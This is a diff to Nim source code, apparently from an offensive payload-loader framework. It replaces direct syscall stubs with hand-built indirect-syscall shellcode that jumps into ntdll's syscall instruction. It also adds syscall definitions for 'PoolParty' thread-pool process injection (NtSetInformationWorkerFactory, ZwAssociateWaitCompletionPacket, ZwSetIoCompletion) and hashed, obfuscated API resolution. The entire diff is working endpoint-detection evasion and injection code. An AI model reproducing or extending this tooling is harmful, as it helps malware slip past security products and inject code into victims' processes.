@@ -145,7 +145,7 @@ when defined(GetSyscallStub):
 
     
     var 
-        SYSCALL_STUB_SIZE: int = 23
+        SYSCALL_STUB_SIZE: int = 21
 
     # Unmanaged NTDLL Declarations
 
@@ -161,6 +161,8 @@ when defined(GetSyscallStub):
     var NtCreateThreadEx: myNtCreateThreadEx
 
     type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
+
+    type myNtDuplicateObject = proc(SourceProcessHandle: HANDLE, SourceHandle: HANDLE, TargetProcessHandle: HANDLE, TargetHandle: PHANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Options: ULONG): NTSTATUS {.stdcall.}
     
     type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
     
@@ -185,6 +187,22 @@ when defined(GetSyscallStub):
     type myNtReadVirtualMemory = proc(ProcessHandle: HANDLE; BaseAddress: PVOID; Buffer: PVOID; NumberOfBytesToRead: SIZE_T; NumberOfBytesRead: PSIZE_T): NTSTATUS {.stdcall.}
 
     var NtReadVirtualMemory: proc(ProcessHandle: HANDLE; BaseAddress: PVOID; Buffer: PVOID; NumberOfBytesToRead: SIZE_T; NumberOfBytesRead: PSIZE_T): NTSTATUS {.stdcall.}
+
+    when defined(poolparty):
+      # NtSetInformationWorkerFactory
+      type myNtSetInformationWorkerFactory = proc(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.stdcall.}
+
+      var NtSetInformationWorkerFactory: proc(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.stdcall.}
+
+      # ZwAssociateWaitCompletionPacket
+      type myZwAssociateWaitCompletionPacket = proc(WaitCopmletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.stdcall.}
+
+      var ZwAssociateWaitCompletionPacket: proc(WaitCopmletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.stdcall.}
+
+      # ZwSetIoCompletion
+      type myZwSetIoCompletion = proc(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.stdcall.}
+
+      var ZwSetIoCompletion: proc(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.stdcall.}
 
     when defined(QueueAPC):
       type myNtQueueApcThread = proc(ThreadHandle: HANDLE, ApcRoutine: PKNORMAL_ROUTINE, ApcArgument1: PVOID, ApcArgument2: PVOID, ApcArgument3: PVOID): NTSTATUS {.stdcall.}
@@ -227,7 +245,13 @@ when defined(GetSyscallStub):
     
     proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
         return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)
-    
+
+    proc find_syscall_address(startAddress: ptr byte, size: int): ptr byte =
+        for i in 0 ..< size - 1:
+            if startAddress[i] == 0x0F.byte and startAddress[i + 1] == 0x05.byte:
+                return addr startAddress[i]
+        return nil
+
     proc GetSyscallStub(functionName: cstring, syscallStub: LPVOID): BOOL =
         var
             file: HANDLE
@@ -236,6 +260,15 @@ when defined(GetSyscallStub):
             fileData: PVOID
             ntdllString: LPCSTR
             nullHandle: HANDLE
+        
+        var indirect_syscall: seq[byte] = @[
+          byte(0x4C), byte(0x8B), byte(0xD1), # mov r10, rcx
+          byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, 0x00 (syscall)
+          byte(0x49), byte(0xBB), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r11, 0x00 (syscallJumpAddress)
+          byte(0x41), byte(0xFF), byte(0xE3), # jmp r11
+          byte(0xC3) # ret
+        ]
+
         when defined(wow64):
             ntdllString = obf("C:\\windows\\syswow64\\ntdll.dll")
         else:
@@ -296,7 +329,56 @@ when defined(GetSyscallStub):
                     # We adjust the functionVA by 7, as for some reason the functionVA is 7 ordinals off compared ntdll from disk to memory
                     functionNameVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2 + 7], rdataSection))
                     functionVA = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 8], textSection))
-                moveMemory(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
+                #moveMemory(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
+                when defined(verbose):
+                    echo obf("[*] Searching for function: ") & $functionName
+                let ssn = cast[ptr byte](functionVA + 4) # Get the SSN from the functionVA address
+                for i in 0 ..< 4:
+                  indirect_syscall[4 + i] = ssn[i] # Fill the indirect_syscall byte array with the SSN
+                when defined(verbose):
+                    echo obf("[*] Got SSN: ") & toHex(indirect_syscall[4]) & toHex(indirect_syscall[5]) & toHex(indirect_syscall[6]) & toHex(indirect_syscall[7])
+                # GetModuleHandleA for ntdll
+                when defined(DInvoke):
+                  var hModule: HMODULE = cast[HMODULE](MyGetModuleHandleA(ntdllString))
+                else:
+                  var hModule: HMODULE = MyGetModuleHandleA(ntdllString)
+
+                when defined(verbose):
+                    if (hModule == 0):
+                        echo obf("[*] MyGetModuleHandleA Error Code: ") & $[GetLastError()]
+                        return 0
+                    else:
+                        echo obf("[*] MyGetModuleHandleA Success")
+                
+                # GetProcAddress for functionName
+                var functionAddress: FARPROC = MyGetProcAddress(hModule, functionName)
+
+                when defined(verbose):
+                    if (functionAddress == nil):
+                        echo obf("[*] MyGetProcAddress Error Code: ") & $[GetLastError()]
+                        return 0
+                    else:
+                        echo obf("[*] MyGetProcAddress Success")
+
+                # get the syscallJumpAddress from the functionAddress
+                var syscallJumpAddress: LPVOID = find_syscall_address(cast[ptr byte](functionAddress), 40)
+
+                when defined(verbose):
+                    if (syscallJumpAddress == nil):
+                        echo obf("[*] Syscall Jump Address not found")
+                        return 0
+                    else:
+                        echo obf("[*] Syscall Jump Address found: ") & repr(syscallJumpAddress)
+
+                # Fill the indirect_syscall byte array with the syscallJumpAddress
+                var sja: uint64 = cast[uint64](syscallJumpAddress)
+                moveMemory(addr indirect_syscall[10], &sja, 8)
+
+                moveMemory(syscallStub, addr indirect_syscall[0], SYSCALL_STUB_SIZE)
+                # print final syscallStub
+                when defined(verbose):
+                    echo obf("[*] Syscall Stub: ") & toHex(indirect_syscall[0]) & toHex(indirect_syscall[1]) & toHex(indirect_syscall[2]) & toHex(indirect_syscall[3]) & toHex(indirect_syscall[4]) & toHex(indirect_syscall[5]) & toHex(indirect_syscall[6]) & toHex(indirect_syscall[7]) & toHex(indirect_syscall[8]) & toHex(indirect_syscall[9]) & toHex(indirect_syscall[10]) & toHex(indirect_syscall[11]) & toHex(indirect_syscall[12]) & toHex(indirect_syscall[13]) & toHex(indirect_syscall[14]) & toHex(indirect_syscall[15]) & toHex(indirect_syscall[16]) & toHex(indirect_syscall[17]) & toHex(indirect_syscall[18]) & toHex(indirect_syscall[19]) & toHex(indirect_syscall[20]) & toHex(indirect_syscall[21])
+
                 stubFound = 1
         return stubFound
 
@@ -391,6 +473,14 @@ let RetrieveSyscallStubs * = """
         syssuccess = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtOpenProcess: ") & $syssuccess
+        
+        var syscallStub_NtDuplicateObject: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (15 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtDuplicateObject
+        var NtDuplicateObject: myNtDuplicateObject = cast[myNtDuplicateObject](cast[LPVOID](syscallStub_NtDuplicateObject))
+
+        syssuccess = GetSyscallStub("NtDuplicateObject", cast[LPVOID](syscallStub_NtDuplicateObject))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtDuplicateObject: ") & $syssuccess
 
         var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
         NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
@@ -430,6 +520,28 @@ let RetrieveSyscallStubs * = """
         syssuccess = GetSyscallStub(obf("NtTestAlert"), cast[LPVOID](syscallStub_NtTestAlert))
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtTestAlert: ") & $syssuccess
+    
+    when defined(poolparty):
+        var syscallStub_NtSetInformationWorkerFactory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (16 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtSetInformationWorkerFactory
+        NtSetInformationWorkerFactory = cast[myNtSetInformationWorkerFactory](cast[LPVOID](syscallStub_NtSetInformationWorkerFactory))
+        syssuccess = GetSyscallStub(obf("NtSetInformationWorkerFactory"), cast[LPVOID](syscallStub_NtSetInformationWorkerFactory))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtSetInformationWorkerFactory: ") & $syssuccess
+
+        var syscallStub_ZwAssociateWaitCompletionPacket: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (17 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define ZwAssociateWaitCompletionPacket
+        ZwAssociateWaitCompletionPacket = cast[myZwAssociateWaitCompletionPacket](cast[LPVOID](syscallStub_ZwAssociateWaitCompletionPacket))
+        syssuccess = GetSyscallStub(obf("ZwAssociateWaitCompletionPacket"), cast[LPVOID](syscallStub_ZwAssociateWaitCompletionPacket))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub ZwAssociateWaitCompletionPacket: ") & $syssuccess
+
+        var syscallStub_ZwSetIoCompletion: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (18 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define ZwSetIoCompletion
+        ZwSetIoCompletion = cast[myZwSetIoCompletion](cast[LPVOID](syscallStub_ZwSetIoCompletion))
+        syssuccess = GetSyscallStub(obf("ZwSetIoCompletion"), cast[LPVOID](syscallStub_ZwSetIoCompletion))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub ZwSetIoCompletion: ") & $syssuccess
 
   
     # get NtFreeVirtualMemory and NtReadVirtualMemory
@@ -476,6 +588,8 @@ let DInvokeUnhookStubs * = """
       CreateFileMappingA_t = proc(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR): HANDLE {.stdcall.}
       MapViewOfFile_t = proc(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T): LPVOID {.stdcall.}
       FreeLibrary_t = proc(hLibModule: HMODULE): WINBOOL {.stdcall.}
+      MyLoadLibraryA_t = proc(lpLibFileName: LPCSTR): HMODULE {.stdcall.}
+      GetModuleFileNameA_t = proc(hModule: HMODULE, lpFilename: LPCSTR, nSize: DWORD): DWORD {.stdcall.}
 
     const
       GetModuleHandleA_HASH  = obf("GetModuleHandleA")
@@ -483,12 +597,16 @@ let DInvokeUnhookStubs * = """
       CreateFileMappingA_HASH  = obf("CreateFileMappingA")
       MapViewOfFile_HASH  = obf("MapViewOfFile")
       FreeLibrary_HASH  = obf("FreeLibrary")
+      LoadLibraryA_HASH  = obf("LoadLibraryA")
+      GetModuleFileNameA_HASH  = obf("GetModuleFileNameA")
 
     var MyGetModuleHandleA: GetModuleHandleA_t
     var MyGetModuleInformation: GetModuleInformation_t
     var MyCreateFileMappingA: CreateFileMappingA_t
     var MyMapViewOfFile: MapViewOfFile_t
     var MyFreeLibrary: FreeLibrary_t
+    var MyLoadLibraryA: MyLoadLibraryA_t
+    var MyGetModuleFileNameA: GetModuleFileNameA_t
 
     MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
 
@@ -499,9 +617,13 @@ let DInvokeUnhookStubs * = """
     MyMapViewOfFile = cast[MapViewOfFile_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), MapViewOfFile_HASH, 0, FALSE))
 
     MyFreeLibrary = cast[FreeLibrary_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), FreeLibrary_HASH, 0, FALSE))
+
+    MyLoadLibraryA = cast[MyLoadLibraryA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE))
+
+    MyGetModuleFileNameA = cast[GetModuleFileNameA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleFileNameA_HASH, 0, FALSE))
 """
 
 let SyscallStubSizeStub * = """
 var 
-    SYSCALL_STUB_SIZE: int = 23
+    SYSCALL_STUB_SIZE: int = 21
 """
